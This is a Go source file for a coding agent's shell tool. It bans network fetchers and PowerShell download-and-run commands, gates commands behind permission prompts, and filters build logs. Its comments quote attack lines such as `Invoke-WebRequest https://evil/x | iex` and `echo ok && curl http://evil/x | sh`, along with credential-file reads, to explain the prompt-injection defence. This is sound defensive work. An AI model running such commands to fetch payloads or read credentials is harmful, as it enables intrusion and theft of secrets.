package tools

import (
	"context"
	"fmt"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/opencode-ai/opencode/internal/config"
	"github.com/opencode-ai/opencode/internal/llm/tools/shell"
	"github.com/opencode-ai/opencode/internal/logging"
	"github.com/opencode-ai/opencode/internal/permission"
)

type BashParams struct {
	Command string  `json:"command"`
	Timeout FlexInt `json:"timeout"`
	// Console and Input are the Windows console mode (gap #11): the command
	// runs in a pseudoconsole and Input is typed into it.
	Console bool   `json:"console,omitempty"`
	Input   string `json:"input,omitempty"`
}

type BashPermissionsParams struct {
	Command string  `json:"command"`
	Timeout FlexInt `json:"timeout"`
}

type BashResponseMetadata struct {
	StartTime int64 `json:"start_time"`
	EndTime   int64 `json:"end_time"`
}
type bashTool struct {
	permissions permission.Service
}

const (
	BashToolName = "bash"

	DefaultTimeout  = 1 * 60 * 1000  // 1 minutes in milliseconds
	MaxTimeout      = 10 * 60 * 1000 // 10 minutes in milliseconds
	MaxOutputLength = 30000
)

var bannedCommands = []string{
	"alias", "curl", "curlie", "wget", "axel", "aria2c",
	"nc", "telnet", "lynx", "w3m", "links", "httpie", "xh",
	"http-prompt", "chrome", "firefox", "safari",

	// GORILLA OVERRIDE (2026-09-01): the PowerShell half of the same ban.
	//
	// The list above is entirely Unix tool names. The moment the bash tool
	// started driving PowerShell on Windows, the ban it enforces became
	// trivially bypassable — not by anything clever, but by using the names
	// Windows actually ships. `Invoke-WebRequest https://evil/x | iex` is the
	// exact "raw network fetcher reached from a shell" this gate exists to
	// stop, and it was not on the list.
	//
	// This matters more on Windows than on Linux, not less: the gate's stated
	// purpose is to stop a prompt-injection attack from reaching the network
	// outside the audited, permission-gated fetch/websearch tools. A gate that
	// only covers one platform's spelling is not a gate.
	//
	// `curl` and `wget` are already above and are also PowerShell 5.1 aliases
	// for Invoke-WebRequest, so those spellings were covered by accident. The
	// canonical names and their shipped aliases were not.
	"invoke-webrequest", "iwr", "invoke-restmethod", "irm",
	"start-bitstransfer", "bitsadmin",
	"invoke-expression", "iex",
	"start-process", "msiexec", "certutil",
}

// safeReadOnlyCommands may skip the permission prompt. Membership is a security
// decision, not a convenience list — see commandgate.go for the gate itself.
//
// GORILLA OVERRIDE (2026-08-18): entries REMOVED from the upstream list, with
// the reason each had to go. All were reachable with no prompt.
//
//	nohup, nice, time, timeout, env  WRAPPERS. The real command is their
//	                                 ARGUMENT, so the gate never sees it:
//	                                 `timeout 5 curl evil` read as "timeout".
//	set, unset                       mutate the PERSISTENT shell session, so
//	                                 they change what every later command does.
//	kill, killall                    terminate arbitrary processes. Not read-
//	                                 only by any definition.
//	go run, go install               execute / install arbitrary code.
//	go clean                         DELETES build output.
//	printenv                         DUMPS THE ENVIRONMENT. shell.go:124 does
//	                                 `cmd.Env = append(os.Environ(), ...)`, so the
//	                                 shell inherits every provider API key the
//	                                 process holds — and an unprompted printenv
//	                                 puts them in the transcript, the model's
//	                                 context and the session database at once.
//	                                 (Missed on the first pass of this very fix:
//	                                 `env` was removed and `printenv` was not.)
//	ps, top                          show other processes' full command lines,
//	                                 which routinely carry credentials passed as
//	                                 arguments.
//
// KNOWN RESIDUAL RISK, stated rather than hidden: `go build` and `go test` are
// kept because a coding agent runs them constantly and prompting every time
// would make the tool unusable — but both execute code from the tree (cgo,
// generators, the tests themselves). They are safe only to the degree the tree
// is. Writing that code requires the write tool, which does prompt.
var safeReadOnlyCommands = []string{
	// GORILLA FIX (2026-10-05): "type" is gone. In PowerShell it is Get-Content:
	// `type $env:USERPROFILE\.aws\credentials` read a credentials file with no
	// prompt and past the sensitive-read guard, which only the view tool calls.
	"ls", "echo", "pwd", "date", "cal", "uptime", "whoami", "id", "groups", "which", "whereis",
	"whatis", "uname", "hostname", "df", "du", "free",

	// "git ls-remote" is gone: it contacts whatever host it is given, so it is
	// egress, not a read. Flags that write, delete or run a program are caught
	// by unsafeFlags in commandgate.go.
	"git status", "git log", "git diff", "git show", "git branch", "git tag", "git remote", "git ls-files",
	"git rev-parse", "git config --get", "git config --list", "git describe", "git blame", "git grep", "git shortlog",

	// "go fmt" (rewrites files), "go mod" (downloads) and "go env" (-w writes
	// the user's Go configuration) are gone: none of them is a read.
	"go version", "go help", "go list", "go doc", "go vet", "go test", "go build",
}

// powerShellGuidance is appended to the bash tool description when the session
// is actually driving PowerShell.
//
// GORILLA OVERRIDE (2026-09-01): renaming "bash" to "powershell" in one sentence
// was not enough, and was actively misleading. The body of the description below
// teaches `&&` for chaining and POSIX paths — and Windows PowerShell 5.1, which
// is what ships with Windows and what this program will find on most machines,
// treats `&&` as a SYNTAX ERROR. The model would emit confident, well-formed
// bash, get a parse error back, and have no way to work out why. Telling it what
// shell it is actually holding is the difference between a tool that works and a
// tool that argues with itself.
const powerShellGuidance = `

# You are driving PowerShell, not bash
This session's shell is PowerShell on Windows. Write PowerShell, not POSIX shell:
- Chain commands with ';'. Windows PowerShell 5.1 does NOT support '&&' or '||' — they are parse errors there. (PowerShell 7+ does support them, but do not rely on it.)
- Use PowerShell cmdlets rather than coreutils: Get-Content (not cat), Get-ChildItem (not ls), Select-String (not grep), Remove-Item (not rm), Copy-Item (not cp), New-Item (not touch/mkdir).
- Environment variables are $env:NAME, set with $env:NAME = 'value'. There is no 'export' and no inline 'VAR=x cmd' prefix.
- Paths use backslashes; quote any path containing spaces. Forward slashes usually work too.
- '2>/dev/null' does not exist; use '2>$null'. There is no /dev/null, /tmp, or ~ — use $env:TEMP and $env:USERPROFILE.
- Bash control flow ('if [ -f x ]', 'for x in *', backtick substitution) is a parse error. Use 'if (Test-Path x)', 'foreach ($x in ...)', '$(cmd)'.
- A command that waits for console input (Read-Host, a y/n prompt) hangs here: pass console=true with the answers in input. Never Get-Credential.
- ConvertFrom-Json returns a PSCustomObject, not a hashtable.
- There is NO Unix userland here. bc, awk, sed, jq, make, tar, less and friends are
  not installed. Do not reach for one because the task looks Unix-shaped; if you
  genuinely need an external program, check it first with Get-Command <name>.
- For arithmetic, do NOT shell out at all. PowerShell evaluates expressions itself:
  write $(2 + 2 * 989), not 'echo ... | bc'.`

func bashDescription() string {
	bannedCommandsStr := strings.Join(bannedCommands, ", ")

	shellName := "bash"
	trailer := ""
	// GORILLA FIX (2026-10-11): the chaining advice and the cd example must
	// name the operator THIS shell accepts. The usage notes below said "';' or
	// '&&'" on every platform while the PowerShell trailer said '&&' is a parse
	// error; measured on a Nemotron session, the model followed the notes
	// three times and each `cd ... && python ...` sat on the parse error for the
	// full 60 s timeout (see shell.go for why it hung rather than failed).
	chainAdvice := "use the ';' or '&&' operator to separate them"
	badChain := "cd /foo/bar && pytest tests"
	if shell.IsWindowsPowerShell() {
		shellName = "PowerShell"
		trailer = powerShellGuidance
		chainAdvice = "use ';' to separate them. NEVER '&&' or '||': Windows PowerShell 5.1 rejects them as a syntax error"
		badChain = `cd C:\foo\bar; pytest tests`
	}

	return fmt.Sprintf(`Executes a given %s command in a persistent shell session with optional timeout, ensuring proper handling and security measures.

Before executing the command, please follow these steps:

1. Directory Verification:
 - If the command will create new directories or files, first use the find tool to verify the parent directory exists and is the correct location
 - For example, before running "mkdir foo/bar", first use find (path="foo") to check that "foo" exists and is the intended parent directory

2. Security Check:
 - For security and to limit the threat of a prompt injection attack, some commands are limited or banned. If you use a disallowed command, you will receive an error message explaining the restriction. Explain the error to the User.
 - Verify that the command is not one of the banned commands: %s.
 - WHY those are banned, so you can explain it when asked: they are raw network fetchers and browsers. Run from a shell they bypass the audited, permission-gated web tools, which is exactly what a prompt-injection attack needs. Nothing is lost: use the websearch tool to search (it drives lynx + a private SearxNG under the hood) and the fetch tool to read a URL. Banned in the shell ≠ absent from the product.

3. Output: over %d characters it is truncated; errors are included.

Usage notes:
- The command argument is required.
- You can specify an optional timeout in milliseconds (up to 600000ms / 10 minutes). If not specified, a command is stopped after 60 seconds, so pass a larger timeout for a build or a test run.
- VERY IMPORTANT: You MUST avoid running shell search/read commands ('grep', 'rg', 'cat', 'head', 'tail', 'ls', and the shell command 'find'). Use the find TOOL to search and list, and the view tool to read files — they are bounded and ranked; raw shell output is not.
- When issuing multiple commands, %s. DO NOT use newlines (newlines are ok in quoted strings).
- IMPORTANT: All commands share the same shell session. Shell state (environment variables, virtual environments, current directory, etc.) persist between commands. For example, if you set an environment variable as part of a command, the environment variable will persist for subsequent commands.
- Try to maintain your current working directory throughout the session by using absolute paths and avoiding usage of 'cd'. You may use 'cd' if the User explicitly requests it.
- %s
- Permission prompts: a command that is not read-only asks the user once. When the user answers "Allow family", every later command that begins with the same approved prefix runs without asking, so prefer repeating an approved command shape with a different tail over inventing a new spelling of it.
<good-example>
pytest /foo/bar/tests
</good-example>
<bad-example>
%s
</bad-example>

# Git and GitHub
When asked to commit or open a PR, use this bash tool with git and the gh CLI. Before committing, run git status/diff/log so the message matches the repo's style, then write a concise message about the "why". Stage only files relevant to the change. Never update git config, never use interactive flags (e.g. git rebase -i, git add -i), never create empty commits, and do not push to a remote unless the user asks. Return an empty response after git/gh commands — the user sees the output directly.
%s`, shellName, bannedCommandsStr, MaxOutputLength, chainAdvice, trashGuidance(), badChain, trailer)
}

// trashGuidance teaches the recycle way for this machine. GORILLA OVERRIDE
// (2026-10-25): see trash.go for the case that needed it.
// Kept short: every turn pays for it (schema_cost_test.go caps the tool at
// 1600 tokens). The refusal carries the long version, RecycleAdvice.
func trashGuidance() string {
	how := "`gio trash <path>` or `trash-put <path>`"
	switch {
	case runtime.GOOS == "windows" || shell.IsWindowsPowerShell():
		how = "`Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.FileIO.FileSystem]::DeleteFile($full, 'OnlyErrorDialogs', 'SendToRecycleBin')` (folder: DeleteDirectory)"
	case runtime.GOOS == "darwin":
		how = "`trash <path>` or Finder via osascript"
	}
	if _, err := lookPathFieldkit(); err == nil {
		how += " or `fieldkit size recycle <paths> --json`"
	}
	return "Trash: rm/Remove-Item/del/rd delete FOR GOOD. For the trash or Recycle Bin use " + how +
		"; if that fails, ask. NEVER fall back to a plain delete."
}

func NewBashTool(permission permission.Service) BaseTool {
	return &bashTool{
		permissions: permission,
	}
}

func (b *bashTool) Info() ToolInfo {
	params := map[string]any{
		"command": map[string]any{
			"type":        "string",
			"description": "The command to execute",
		},
		"timeout": map[string]any{
			"type":        "number",
			"description": "Optional timeout in milliseconds (max 600000)",
		},
	}
	// Windows only (gap #11): the schema elsewhere does not pay for a mode
	// that does not exist there.
	if shell.ConsoleSupported() {
		params["console"] = map[string]any{
			"type":        "boolean",
			"description": "Run in a real console (prompts, Read-Host); a separate process, not this session",
		}
		params["input"] = map[string]any{
			"type":        "string",
			"description": "With console: text typed in, one line per answer",
		}
	}
	return ToolInfo{
		Name:        BashToolName,
		Description: bashDescription(),
		Parameters:  params,
		Required:    []string{"command"},
	}
}

// bashVerdict is what the gate decides about a command BEFORE anything runs.
// Split out of Run so the decision can be replayed over a recorded session
// without executing a single command (see session_replay_test.go).
type bashVerdict struct {
	// Banned names the banned program found anywhere in the line, or "".
	Banned string
	// ReadOnly is true when the whole line may skip the prompt.
	ReadOnly bool
	// Irreversible is the dangerous-pattern sentence, or "".
	Irreversible string
	// Description is the sentence shown on the prompt.
	Description string
	// HardStop is why auto-approve still asks (sudo, a system-wide install),
	// or "". See commandclass.go.
	HardStop string
	// PermanentDelete is the delete program or call found on the line (a
	// plain delete skips the Recycle Bin), or "". ScratchOnly is true when
	// every target is temp or build output. See trash.go.
	PermanentDelete string
	ScratchOnly     bool
}

func bashGateVerdict(command string) bashVerdict {
	v := bashVerdict{Description: fmt.Sprintf("Execute command: %s", command)}
	if v.Banned = BannedCommandIn(command, bannedCommands); v.Banned != "" {
		return v
	}
	v.ReadOnly = IsSafeReadOnly(command, readOnlyList())
	if !v.ReadOnly {
		v.HardStop = HardStopIn(command)
	}
	// GORILLA OVERRIDE (2026-10-04): a command that cannot be taken back says so
	// in the prompt, is never treated as read-only, and is asked about even
	// when auto-approve is on. See dangerous.go.
	if d := DangerousPatternIn(command); d != nil {
		v.Irreversible = d.Why
		v.ReadOnly = false
		v.Description = fmt.Sprintf("DANGEROUS — %s.\nExecute command: %s", d.Why, command)
		return v
	}
	// GORILLA OVERRIDE (2026-10-25): a plain delete says, on the prompt and
	// over ACP (which shows Description as the title), that nothing goes to
	// the Recycle Bin. See trash.go.
	if v.PermanentDelete = PermanentDeleteIn(command); v.PermanentDelete != "" {
		v.ReadOnly = false
		v.ScratchOnly = OnlyScratchTargets(command)
		v.Description = fmt.Sprintf("PERMANENT DELETE — %s.\nExecute command: %s", PermanentDeleteWhy, command)
	}
	return v
}

// refuseUnwatchedPermanentDelete is rule 2 of trash.go: the person asked for
// the trash, nobody is answering prompts, and the line deletes for good
// something that is not temp or build output.
func (b *bashTool) refuseUnwatchedPermanentDelete(sessionID string, v bashVerdict) bool {
	if v.PermanentDelete == "" || v.ScratchOnly || !TrashAsked(sessionID) {
		return false
	}
	return config.PermissionMode() == config.PermissionAuto || b.permissions.IsAutoApproved(sessionID)
}

// bashPermissionRequest is the question Run asks for a command the gate did
// not wave through.
func (b *bashTool) bashPermissionRequest(sessionID, command string, v bashVerdict) permission.CreatePermissionRequest {
	// GORILLA FIX (2026-10-11): propose a family from what this session has
	// already asked, so the second variant of a command can be the last
	// prompt for it. Never for an irreversible command: the family grant
	// would refuse to cover it anyway, and the dialog must not suggest one.
	family, class := "", ""
	if v.Irreversible == "" {
		family = SuggestCommandFamily(command, b.permissions.AskedKeys(sessionID, BashToolName))
		// GORILLA OVERRIDE (2026-10-23): "Allow for session" remembers the
		// class (program and subcommand, `pip3 install`) in this place, not
		// the one exact string. Same bounds as a family; see
		// permission.GrantPersistant.
		class = SuggestCommandFamily(command, nil)
	}
	return permission.CreatePermissionRequest{
		SessionID: sessionID,
		// GORILLA FIX (2026-10-05): the path is the one the command
		// reaches OUTSIDE the project, when it names one. It was
		// always the working directory, so auto-approve's rule "not
		// outside every workspace root" could never apply to a shell
		// command: `Set-Content $env:USERPROFILE\.ssh\authorized_keys`
		// was approved as if it were project work.
		Path:     bashRequestPath(command),
		ToolName: BashToolName,
		Action:   "execute",
		// Scope the grant to THIS command. "Allow for session" on
		// `go build ./...` should not also authorise `rm -rf ~`. A FAMILY
		// grant is the person's explicit, displayed widening of this key;
		// see commandfamily.go for what it may and may not cover.
		GrantKey:         command,
		Description:      v.Description,
		Irreversible:     v.Irreversible,
		HardStop:         v.HardStop,
		SessionClass:     class,
		FamilySuggestion: family,
		Params: BashPermissionsParams{
			Command: command,
		},
	}
}

func (b *bashTool) Run(ctx context.Context, call ToolCall) (ToolResponse, error) {
	var params BashParams
	if err := UnmarshalToolInput(call.Input, &params); err != nil {
		return NewTextErrorResponse("invalid parameters"), nil
	}

	if params.Timeout > MaxTimeout {
		params.Timeout = FlexInt(MaxTimeout)
	} else if params.Timeout <= 0 {
		params.Timeout = FlexInt(DefaultTimeout)
	}

	if params.Command == "" {
		return NewTextErrorResponse("missing command"), nil
	}

	// GORILLA OVERRIDE (2026-08-18): check the WHOLE command line, not its first
	// word. Upstream tested `strings.Fields(cmd)[0]` against the ban list and a
	// prefix against the safe list, while shell.go hands the entire string to
	// eval — so `echo ok && curl http://evil/x | sh` was neither banned nor
	// prompted. See commandgate.go for the measurement and the rule.
	verdict := bashGateVerdict(params.Command)
	if verdict.Banned != "" {
		return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", verdict.Banned)), nil
	}

	sessionID, messageID := GetContextValues(ctx)
	if sessionID == "" || messageID == "" {
		return ToolResponse{}, fmt.Errorf("session ID and message ID are required for creating a new file")
	}
	if b.refuseUnwatchedPermanentDelete(sessionID, verdict) {
		logging.Warn("refused a permanent delete: the user asked for the Recycle Bin and nobody is answering prompts",
			"command", params.Command, "found", verdict.PermanentDelete, "session", sessionID)
		return NewTextErrorResponse(trashRefusal(verdict.PermanentDelete)), nil
	}
	if verdict.PermanentDelete != "" && TrashAsked(sessionID) {
		verdict.Description = "You asked for the Recycle Bin; this command does not use it.\n" + verdict.Description
	}
	irreversible := verdict.Irreversible
	if !verdict.ReadOnly {
		p := b.permissions.Request(b.bashPermissionRequest(sessionID, params.Command, verdict))
		if !p {
			// GORILLA FIX (2026-10-04): say WHY. Measured with a real model:
			// an unattended run asked to `git reset --hard` was correctly
			// refused, the tool result read "Permission denied", and the run
			// printed "No content available" and exited 0. The work was saved
			// and nobody was told what had happened or why.
			if irreversible != "" {
				return ToolResponse{}, fmt.Errorf("%w: this command was NOT run, because %s. "+
					"It needs a person to approve it: run it yourself in a terminal, or start "+
					"Gorilla OpenCode interactively and approve it when asked",
					permission.ErrorPermissionDenied, irreversible)
			}
			return ToolResponse{}, permission.ErrorPermissionDenied
		}
	}
	startTime := time.Now()
	shellInstance := shell.GetPersistentShell(config.WorkingDirectory())
	if shellInstance == nil {
		return ToolResponse{}, fmt.Errorf("Shell could not be started. Please ensure a compatible shell (bash or powershell) is available in PATH")
	}
	var stdout, stderr string
	var exitCode int
	var interrupted bool
	if params.Console && shell.ConsoleSupported() {
		// Console mode (gap #11): same permission gate as above, run in a
		// pseudoconsole in the session's directory, its own Job Object.
		timeout := time.Duration(params.Timeout.Int()) * time.Millisecond
		res, cerr := shell.RunInConsole(ctx, "", params.Command, shellInstance.Cwd(), params.Input, timeout)
		if cerr != nil {
			return ToolResponse{}, fmt.Errorf("error executing command in a console: %w", cerr)
		}
		stdout, exitCode, interrupted = res.Output, res.ExitCode, res.Interrupted
	} else {
		var err error
		stdout, stderr, exitCode, interrupted, err = shellInstance.Exec(ctx, params.Command, params.Timeout.Int())
		if err != nil {
			return ToolResponse{}, fmt.Errorf("error executing command: %w", err)
		}
	}

	// GORILLA OVERRIDE: filter noisy build logs to their signal (errors,
	// warnings, file:line) before the naive first/last-half truncation,
	// which on a long make/mach build would otherwise drop the actual
	// error sitting in the middle. See filterBuildLog.
	stdout = filterBuildLog(stdout)
	stderr = filterBuildLog(stderr)
	stdout = truncateOutput(stdout)
	stderr = truncateOutput(stderr)

	errorMessage := stderr
	if interrupted {
		if errorMessage != "" {
			errorMessage += "\n"
		}
		errorMessage += "Command was aborted before completion"
	} else if exitCode != 0 {
		if errorMessage != "" {
			errorMessage += "\n"
		}
		errorMessage += fmt.Sprintf("Exit code %d", exitCode)
		// robocopy 1-7, fc 1 ...: the code is information, and the line
		// after it says so (exitcodes.go). The receipt reads the same table.
		if meaning, _ := ExitCodeMeaning(params.Command, exitCode); meaning != "" {
			errorMessage += "\n" + meaning
		}
	}

	hasBothOutputs := stdout != "" && stderr != ""

	if hasBothOutputs {
		stdout += "\n"
	}

	if errorMessage != "" {
		stdout += "\n" + errorMessage
	}

	metadata := BashResponseMetadata{
		StartTime: startTime.UnixMilli(),
		EndTime:   time.Now().UnixMilli(),
	}
	if stdout == "" {
		// GORILLA FIX (2026-09-02): state the exit code, do not leave success
		// as an absence for the model to infer.
		//
		// A command that succeeds silently -- go build, mkdir, a passing test
		// runner -- returned the bare words "no output". Observed live: Gemma 4
		// ran `go build .`, got "no output", and reasoned "I must assume success
		// unless subsequent steps indicate failure". It assumed correctly, but it
		// ASSUMED, and the next thing it said -- the name of the binary -- was
		// wrong for the same reason.
		//
		// A non-zero exit already appends "Exit code N" above, so failure was
		// always stated. Only success was silent, which is the wrong way round:
		// silence is exactly what the PowerShell wrapper used to report for
		// failures too, and a model that has learned to read silence as success
		// is one bad wrapper away from believing a lie.
		return WithResponseMetadata(
			NewTextResponse("no output (exit code 0 — the command succeeded and printed nothing)"),
			metadata), nil
	}
	return WithResponseMetadata(NewTextResponse(stdout), metadata), nil
}

// GORILLA OVERRIDE: build-log signal extraction. Raw output from
// `make -j`, `./mach build`, `cargo build`, kbuild, etc. is thousands of
// progress lines (CC/CXX/AR/LD/...) that saturate the model's context and
// bury the one line that matters. When output is long AND looks like a
// build/compile log, we keep only the lines that carry signal — errors,
// warnings, linker failures, and the file:line they point at — plus a
// little context, and note how much was dropped. Opt out with
// GORILLA_OPENCODE_NO_LOG_FILTER=1. This is the SWE-agent finding: bounded,
// filtered tool output is the single biggest lever for build agents.
var (
	buildSignalRe = regexp.MustCompile(`(?i)(\berror\b:|fatal error:|undefined reference|undefined symbol|multiple definition|recipe for target .* failed|make(\[\d+\])?: \*\*\*|ld: |ld\.lld: |collect2:|linker command failed|cannot find|no such file|: warning:|warning generated|note: |panic:|Segmentation fault|failed with exit|Error \d)`)
	// GORILLA OVERRIDE: every tool name here MUST be followed by
	// whitespace. Without that the alternation matched as a bare prefix,
	// so `ld:`, `cc1plus:`, `arch/x86/...` and `assertion` were all
	// classified as progress noise — i.e. the filter deleted the first
	// line of failure on exactly the kernel and Gecko builds it was
	// written for. Guarded by bash_logfilter_test.go.
	buildNoiseRe  = regexp.MustCompile(`(?i)^\s*((cc|cxx|ar|ld|as|ranlib|cpp|gen|copy|install|strip|objcopy|host cc|host cxx)\s|(compiling|building|checking)\b|make(\[\d+\])?:\s+(entering|leaving|nothing to be done)|\[\s*\d+%\]|\d+/\d+\s)`)
	buildMarkerRe = regexp.MustCompile(`(?i)(\bgcc\b|\bclang\b|\bmake\b|\bmach\b|\bcargo\b|\bcmake\b|\bninja\b|\bmozconfig\b|CC\s|CXX\s|\.o\b|\.rlib\b)`)
	fileLineRe    = regexp.MustCompile(`^[^\s:][^:]*:\d+(:\d+)?:`)
)

func filterBuildLog(content string) string {
	if on, _ := strconv.ParseBool(os.Getenv("GORILLA_OPENCODE_NO_LOG_FILTER")); on {
		return content
	}
	lines := strings.Split(content, "\n")
	if len(lines) < 200 {
		return content
	}
	// Only engage when this really looks like a build log.
	markers := 0
	for _, l := range lines {
		if buildMarkerRe.MatchString(l) {
			markers++
			if markers >= 5 {
				break
			}
		}
	}
	if markers < 5 {
		return content
	}

	var kept []string
	keptIdx := map[int]bool{}
	for i, l := range lines {
		if buildSignalRe.MatchString(l) || fileLineRe.MatchString(l) {
			// GORILLA OVERRIDE: signal beats noise. The noise test used
			// to be applied to the matched line itself as well as to its
			// context, so a line that was both — `ld: cannot find -lssl`
			// is the canonical case — was discarded despite being the
			// whole reason to keep anything. Context lines are still
			// noise-filtered; the signal line never is.
			for j := i - 1; j <= i+1; j++ {
				if j < 0 || j >= len(lines) || keptIdx[j] {
					continue
				}
				if j != i && buildNoiseRe.MatchString(lines[j]) {
					continue
				}
				keptIdx[j] = true
				kept = append(kept, lines[j])
			}
		}
	}
	if len(kept) == 0 {
		// Successful/no-error build: don't dump thousands of lines,
		// just the tail so the agent sees it completed.
		tail := lines
		if len(lines) > 40 {
			tail = lines[len(lines)-40:]
		}
		return fmt.Sprintf("[build log: %d lines, no error/warning lines detected — showing last %d]\n%s",
			len(lines), len(tail), strings.Join(tail, "\n"))
	}
	dropped := len(lines) - len(kept)
	return fmt.Sprintf("[build log filtered: %d of %d lines were compile/progress noise; showing the %d signal lines. Set GORILLA_OPENCODE_NO_LOG_FILTER=1 for raw output.]\n%s",
		dropped, len(lines), len(kept), strings.Join(kept, "\n"))
}

func truncateOutput(content string) string {
	if len(content) <= MaxOutputLength {
		return content
	}

	halfLength := MaxOutputLength / 2
	start := content[:halfLength]
	end := content[len(content)-halfLength:]

	truncatedLinesCount := countLines(content[halfLength : len(content)-halfLength])
	// The middle is where a build's first error usually is. Keep it on disk
	// rather than make the model run the command again to see it. See spill.go.
	//
	// GORILLA FIX (2026-10-04): the notice is stated at the END as well, and it
	// says what must not be concluded. Measured with a real model the same day:
	// gemma-4-e2b was asked for the one line containing NEEDLE in 6,001 lines of
	// output. The line was in the cut middle, the complete output was on disk,
	// and the notice naming the file sat in the middle of 30,000 bytes. The
	// model never opened the file and answered "the word NEEDLE was not found in
	// the output" — a false statement drawn from a fragment, which is the exact
	// failure clampToolContent's own comment warns about. A notice the reader
	// does not see is not a notice. The last lines of a result are the ones a
	// model weighs most, so that is where it goes.
	// GORILLA FIX (2026-10-05): mask BEFORE the copy is saved. The full output
	// was written to disk raw and the model was then told to search that file
	// with find, whose output is not shape-masked: a secret in the cut middle
	// could be fetched back out by the very notice meant to help.
	spillCopy, _ := MaskSecrets(BashToolName, content)
	notice := spillNotice(spillOutput("bash", spillCopy))
	tail := fmt.Sprintf("\n\n[OUTPUT TRUNCATED: %d lines from the MIDDLE are not shown above. "+
		"Do not conclude that something is absent from this output: it may be in the part not shown.%s]",
		truncatedLinesCount, notice)
	return fmt.Sprintf("%s\n\n... [%d lines truncated here; see the note at the end] ...\n\n%s%s",
		start, truncatedLinesCount, end, tail)
}

func countLines(s string) int {
	if s == "" {
		return 0
	}
	return len(strings.Split(s, "\n"))
}
